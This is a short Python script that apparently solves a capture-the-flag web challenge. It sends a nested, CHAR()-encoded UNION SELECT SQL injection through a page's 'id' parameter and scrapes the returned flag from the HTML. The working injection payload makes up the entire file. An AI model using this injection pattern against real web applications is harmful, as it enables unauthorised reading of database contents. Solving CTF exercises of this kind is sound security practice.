import requests
from bs4 import BeautifulSoup

def encode(query):
    payload = "CHAR("
    for c in query:
        payload += str(ord(c)) + ", "
    payload = payload[:-2] + ")"

    return payload


url = f'http://inception.challs.olicyber.it/see.php?id=0 UNION SELECT {encode("0 UNION SELECT flag FROM flag -- ")},null,null -- -'

r = requests.get(url)

soup = BeautifulSoup(r.text, "html.parser")
flag = soup.find_all("p")[-1]
print(flag.text)